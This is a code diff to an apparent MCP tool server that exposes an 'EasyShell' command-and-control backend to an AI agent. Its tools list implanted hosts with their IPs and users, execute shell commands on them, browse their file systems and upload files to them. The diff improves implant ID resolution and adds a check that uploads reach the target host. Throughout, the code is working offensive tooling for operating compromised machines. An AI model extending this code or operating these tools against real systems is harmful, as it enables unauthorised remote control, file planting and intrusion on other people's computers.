@@ -59,6 +59,61 @@ def _online_flag(val: str) -> bool:
     return str(val).strip() == "1"
 
 
+async def _fetch_clients(api: EasyShellAPI) -> list[dict]:
+    resp = await api.get("client/clientslist", params={"page": 1, "page_size": 9999})
+    if not _ok(resp):
+        return []
+    return (resp.get("data") or {}).get("list") or []
+
+
+async def _resolve_uid(api: EasyShellAPI, uid: str) -> str:
+    """将 UID 前缀解析为完整 32 位 MD5；list_clients 展示截断时 MCP 调用方可能只传前缀。"""
+    uid = uid.strip()
+    if not uid:
+        return uid
+    items = await _fetch_clients(api)
+    uids = [str(c.get("Uid", "")).strip() for c in items if c.get("Uid")]
+    if uid in uids:
+        return uid
+    matches = [u for u in uids if u.startswith(uid)]
+    if len(matches) == 1:
+        return matches[0]
+    if len(matches) > 1:
+        raise ValueError(f"UID 前缀 {uid!r} 匹配多个客户端: {', '.join(matches)}")
+    return uid
+
+
+def _format_upload_job(u: dict) -> str:
+    name = str(u.get("fileName") or u.get("FileName") or "?")[:24]
+    part = u.get("uploadPart", u.get("UploadPart", 0))
+    size = u.get("fileSize") or u.get("FileSize") or "?"
+    status = u.get("status") or u.get("State") or "?"
+    err = u.get("error") or u.get("Error") or ""
+    line = f"  {name:<24} | {part:>3}% | {size:<8} | {status}"
+    if err:
+        line += f" | {err}"
+    return line
+
+
+async def _wait_upload_dispatch(
+    api: EasyShellAPI, uid: str, upload_id: str, *, timeout: float = 600.0
+) -> tuple[bool, str]:
+    deadline = time.time() + timeout
+    while time.time() < deadline:
+        resp = await api.get("client/uploads/info", params={"uid": uid})
+        if _ok(resp):
+            for job in resp.get("data") or []:
+                if str(job.get("uploadId", "")) != upload_id:
+                    continue
+                status = str(job.get("status") or "")
+                if status == "done":
+                    return True, "done"
+                if status == "error":
+                    return False, str(job.get("error") or "upload error")
+        await asyncio.sleep(2)
+    return False, "下发超时（植入体可能离线或 UID 不正确）"
+
+
 def _parse_headers(text: str) -> dict[str, str]:
     headers: dict[str, str] = {}
     for line in text.strip().splitlines():
@@ -134,14 +189,14 @@ async def easyshell_list_clients(online_only: bool = True) -> str:
         return "没有匹配的客户端"
 
     lines = ["UID | 主机 | 内网IP | 外网IP | 用户 | 协议 | 在线"]
-    lines.append("-" * 90)
+    lines.append("-" * 110)
     for c in items:
         flag = "+" if _online_flag(c.get("Online", "")) else "-"
         lines.append(
-            "  %s %-12s | %-12s | %-15s | %-15s | %-10s | %-8s"
+            "  %s %-32s | %-12s | %-15s | %-15s | %-10s | %-8s"
             % (
                 flag,
-                str(c.get("Uid", "?"))[:12],
+                str(c.get("Uid", "?")),
                 str(c.get("Computer", "?"))[:12],
                 str(c.get("InternalIP", "?"))[:15],
                 str(c.get("ExternalIP", "?"))[:15],
@@ -150,6 +205,7 @@ async def easyshell_list_clients(online_only: bool = True) -> str:
             )
         )
     lines.append(f"共 {len(items)} 条")
+    lines.append("提示: 下发命令/上传文件时请使用完整 UID（32 位）；仅前缀时也支持自动解析。")
     return "\n".join(lines)
 
 
@@ -165,7 +221,10 @@ async def easyshell_exec_cmd(uid: str, command: str, timeout: int = 30) -> str:
         timeout: 最长等待秒数
     """
     api = _get_api()
-    uid = uid.strip()
+    try:
+        uid = await _resolve_uid(api, uid.strip())
+    except ValueError as e:
+        return str(e)
 
     before = await api.get("client/shell/getshellcontent", params={"uid": uid, "_t": int(time.time() * 1000)})
     base = (before.get("data") or "") if _ok(before) else ""
@@ -222,27 +281,35 @@ async def easyshell_list_dir(uid: str, path: str) -> str:
     """列出植入体目录（走 file/tree API，不创建 cmd.exe）。
 
     Args:
-        uid: 植入体 UID
+        uid: 植入体 UID（完整 32 位，或唯一前缀）
         path: 目录路径，Windows 用正斜杠如 C:/Users
     """
     api = _get_api()
-    resp = await api.post("client/file/tree", json_body={"uid": uid.strip(), "dirPath": path}, timeout=130)
+    try:
+        uid = await _resolve_uid(api, uid.strip())
+    except ValueError as e:
+        return str(e)
+    resp = await api.post(
+        "client/file/tree",
+        json_body={"uid": uid, "dirPath": path, "forceRefresh": True},
+        timeout=130,
+    )
     if not _ok(resp):
         return f"列出失败: {_err(resp)}"
     data = resp.get("data")
-    if isinstance(data, list):
+    items: list = []
+    if isinstance(data, dict):
+        items = data.get("entries") or data.get("items") or data.get("children") or []
+    elif isinstance(data, list):
         items = data
-    elif isinstance(data, dict):
-        items = data.get("items") or data.get("children") or []
-    else:
-        items = []
     if not items:
         return f"目录为空或不存在: {path}"
     lines = [f"{path} ({len(items)} 项):", ""]
     for f in items[:200]:
         if isinstance(f, dict):
             name = f.get("name") or f.get("Name") or "?"
-            is_dir = f.get("isDir") or f.get("IsDir") or f.get("type") == "dir"
+            typ = str(f.get("type") or f.get("Type") or "").upper()
+            is_dir = typ == "D" or f.get("isDir") or f.get("IsDir")
             size = f.get("size") or f.get("Size") or 0
             mark = "D" if is_dir else "F"
             lines.append(f"  [{mark}] {name}  {size}")
@@ -575,27 +642,38 @@ async def easyshell_upload_file(uid: str, local_path: str, remote_path: str) -> 
     """上传本地文件到植入体（multipart，跳过加密）。
 
     Args:
-        uid: 植入体 UID
+        uid: 植入体 UID（完整 32 位，或唯一前缀）
         local_path: 本机文件绝对路径
-        remote_path: 植入体目标目录，如 C:/Temp
+        remote_path: 植入体目标完整路径（含文件名），如 C:/Users/Admin/Desktop/a.jpg
     """
     api = _get_api()
+    try:
+        uid = await _resolve_uid(api, uid.strip())
+    except ValueError as e:
+        return str(e)
     p = Path(local_path)
     if not p.is_file():
         return f"本地文件不存在: {local_path}"
     content = p.read_bytes()
     resp = await api.upload_multipart(
         "client/file/upload",
-        fields={"uid": uid.strip(), "uploadPath": remote_path},
+        fields={"uid": uid, "uploadPath": remote_path},
         file_field="file",
         file_content=content,
         filename=p.name,
         timeout=600,
     )
-    if _ok(resp):
-        data = resp.get("data") or {}
-        return f"已下发上传: {p.name} → {remote_path} (uploadId={data.get('uploadId')}, {data.get('totalBytes')} bytes)"
-    return f"上传失败: {_err(resp)}"
+    if not _ok(resp):
+        return f"上传失败: {_err(resp)}"
+    data = resp.get("data") or {}
+    upload_id = str(data.get("uploadId") or "")
+    base = f"已入队: {p.name} → {remote_path} (uid={uid}, uploadId={upload_id}, {data.get('totalBytes')} bytes)"
+    if not upload_id:
+        return base + "\n警告: 未返回 uploadId，无法确认植入体是否收到"
+    ok, detail = await _wait_upload_dispatch(api, uid, upload_id)
+    if ok:
+        return base + "\n上传完成: 文件已写入目标主机"
+    return base + f"\n上传未完成: {detail}"
 
 
 @mcp.tool()
@@ -981,20 +1059,23 @@ async def easyshell_get_client(uid: str) -> str:
         uid: 植入体 UID
     """
     api = _get_api()
-    resp = await api.get("client/clientslist", params={"page": 1, "page_size": 9999})
-    if not _ok(resp):
-        return f"查询失败: {_err(resp)}"
-    items = (resp.get("data") or {}).get("list") or []
-    uid = uid.strip()
+    items = await _fetch_clients(api)
+    if not items:
+        return "查询失败或无客户端"
+    uid_in = uid.strip()
+    try:
+        uid_resolved = await _resolve_uid(api, uid_in)
+    except ValueError as e:
+        return str(e)
     for c in items:
-        if str(c.get("Uid", "")).strip() == uid:
+        if str(c.get("Uid", "")).strip() == uid_resolved:
             lines = [f"UID: {c.get('Uid')}"]
             for k in ("Computer", "InternalIP", "ExternalIP", "Username", "Listener",
                        "Online", "Sleep", "Arch", "Group", "Note", "Pid", "Process"):
                 if c.get(k) not in (None, ""):
                     lines.append(f"  {k}: {c.get(k)}")
             return "\n".join(lines)
-    return f"未找到 UID: {uid}"
+    return f"未找到 UID: {uid_in}"
 
 
 @mcp.tool()
@@ -1179,23 +1260,19 @@ async def easyshell_upload_status(uid: str) -> str:
         uid: 植入体 UID
     """
     api = _get_api()
-    resp = await api.get("client/uploads/info", params={"uid": uid.strip()})
+    try:
+        uid = await _resolve_uid(api, uid.strip())
+    except ValueError as e:
+        return str(e)
+    resp = await api.get("client/uploads/info", params={"uid": uid})
     if not _ok(resp):
         return f"查询失败: {_err(resp)}"
     items = resp.get("data") or []
     if not items:
         return "无上传任务"
-    lines = ["文件名 | 进度 | 状态", "-" * 60]
+    lines = ["文件名 | 进度 | 大小 | 状态", "-" * 60]
     for u in items[:20]:
-        lines.append(
-            "  %-20s | %s/%s | %s"
-            % (
-                str(u.get("FileName", "?"))[:20],
-                u.get("UploadedSize", 0),
-                u.get("TotalSize", 0),
-                u.get("State", "?"),
-            )
-        )
+        lines.append(_format_upload_job(u))
     return "\n".join(lines)
 
 
